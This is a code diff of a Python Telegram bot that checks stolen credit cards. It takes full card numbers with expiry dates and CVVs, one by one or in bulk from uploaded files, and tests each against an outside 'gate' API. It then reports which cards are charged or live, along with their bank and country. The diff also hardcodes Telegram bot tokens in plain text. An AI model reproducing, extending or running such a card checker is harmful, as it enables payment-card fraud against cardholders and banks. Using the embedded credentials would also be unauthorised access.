@@ -2,10 +2,11 @@ import os
 import re
 import requests
 import time
+import asyncio
 from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
-TOKEN = '8692960014:AAEpYPo0XTj8F2DmAeUgdaf9_w06MWFYDeI'
+TOKEN = '8323296411:AAGUZjVkEfGtf5SaHMb9XqoQGJ7taFEuHZQ'
 API_URL = "http://gatescheck.duckdns.org:7000/check"
 
 stop_users = {}
@@ -41,39 +42,28 @@ def check_card_api(card_full):
         elif "insufficient" in result:
             return "live", "Insufficient Funds"
         else:
-            return "error", result_raw
-
-    except Exception:
-        return "error", "Error"
+            return "declined", result_raw
+    except:
+        return "declined", "Error"
 
 # ------------------- Format Response -------------------
 def format_response(card_full, status, response, taken):
     bin_number = card_full.split("|")[0][:6]
     info, bank, country = get_bin_info(bin_number)
 
-    if status == "approved":
-        title = "#Paypal_Cvv_Charged☠"
-        stat = "APPROVED ✅"
-    elif status == "live":
-        title = "#Paypal_Live🟢"
-        stat = "LIVE 🟢"
-    else:
-        title = "#Paypal_Cvv_Charged☠"
-        stat = "Declined !"
+    title = "#Charge ✅" if status == "approved" else "#Live 🟢"
 
-    text = f"""{title} [/pp] ($0.50)
-- - - - - - - - - - - - - - - - - - - - - -
-[ϟ] 𝐂𝐚𝐫𝐝: {card_full}
-[ϟ] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {response}
-[ϟ] 𝐒𝐭𝐚𝐭𝐮𝐬: {stat}
-[ϟ] 𝐓𝐚𝐤𝐞𝐧: {taken} 𝐒.
-- - - - - - - - - - - - - - - - - - - - - -
-[ϟ] 𝐈𝐧𝐟𝐨: {info}
-[ϟ] 𝐁𝐚𝐧𝐤: {bank}
-[ϟ] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
-- - - - - - - - - - - - - - - - - - - - - -
-[⌥] 𝐓𝐢𝐦𝐞: {taken} 𝐒."""
-    return text
+    return f"""{title}
+
+💳 Card: {card_full}
+📨 Response: {response}
+
+🏦 Info: {info}
+🏛 Bank: {bank}
+🌍 Country: {country}
+
+⏱ Time: {taken}s
+"""
 
 # ------------------- /pp -------------------
 async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -86,8 +76,11 @@ async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     status, response = check_card_api(card_full)
     taken = round(time.time() - start_time, 2)
 
-    text = format_response(card_full, status, response, taken)
-    await update.message.reply_text(text)
+    if status in ["approved", "live"]:
+        text = format_response(card_full, status, response, taken)
+        await update.message.reply_text(text)
+    else:
+        await update.message.reply_text("Declined ❌")
 
 # ------------------- /stop -------------------
 async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -111,44 +104,78 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     live = 0
     declined = 0
 
+    last_card = "None"
+    last_response = "None"
+    last_status = "None"
+    last_panel = ""
+
     panel_msg = await update.message.reply_text("Start Checking... 🔍")
 
     with open(file_path, 'r', encoding='utf-8') as f:
-        lines = f.readlines()
+        for line in f:
+            if stop_users.get(user_id):
+                await update.message.reply_text("Stopped ⛔")
+                return
 
-    for line in lines:
-        if stop_users.get(user_id):
-            await update.message.reply_text("Stopped ⛔")
-            return
+            line = line.strip()
+            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
+            if not match:
+                continue
 
-        line = line.strip()
-        match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
-        if not match:
-            continue
+            card_full = match[0]
 
-        card_full = match[0]
-        start_time = time.time()
-        status, response = check_card_api(card_full)
-        taken = round(time.time() - start_time, 2)
+            try:
+                start_time = time.time()
+                status, response = check_card_api(card_full)
+                taken = round(time.time() - start_time, 2)
+            except:
+                status = "declined"
+                response = "Error"
+                taken = 0
 
-        text = format_response(card_full, status, response, taken)
-        await update.message.reply_text(text)
+            # تحديث آخر نتيجة
+            last_card = card_full
+            last_response = response
 
-        if status == "approved":
-            approved += 1
-        elif status == "live":
-            live += 1
-        else:
-            declined += 1
+            if status == "approved":
+                approved += 1
+                last_status = "Charge ✅"
+            elif status == "live":
+                live += 1
+                last_status = "Live 🟢"
+            else:
+                declined += 1
+                last_status = "Declined ❌"
 
-        panel = f"""📊 Status
+            # إرسال فقط Live و Charge
+            if status in ["approved", "live"]:
+                text = format_response(card_full, status, response, taken)
+                await update.message.reply_text(text)
+
+            panel = f"""📊 Status
 
 ✅ Charge: {approved}
 🟢 Live: {live}
 ❌ Declined: {declined}
+📂 Total: {approved + live + declined}
+
+━━━━━━━━━━━━━━━
+💳 Last Card: {last_card}
+📨 Response: {last_response}
+📌 Status: {last_status}
+━━━━━━━━━━━━━━━
+
 ⛔ Stop: {'ON' if stop_users.get(user_id) else 'OFF'}
 """
-        await panel_msg.edit_text(panel)
+
+            if panel != last_panel:
+                try:
+                    await panel_msg.edit_text(panel)
+                    last_panel = panel
+                except:
+                    pass
+
+            await asyncio.sleep(1)
 
     await update.message.reply_text("Done ✅")
 
@@ -166,7 +193,6 @@ def main():
     app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
 
     app.run_polling()
-
 
 if __name__ == "__main__":
     main()
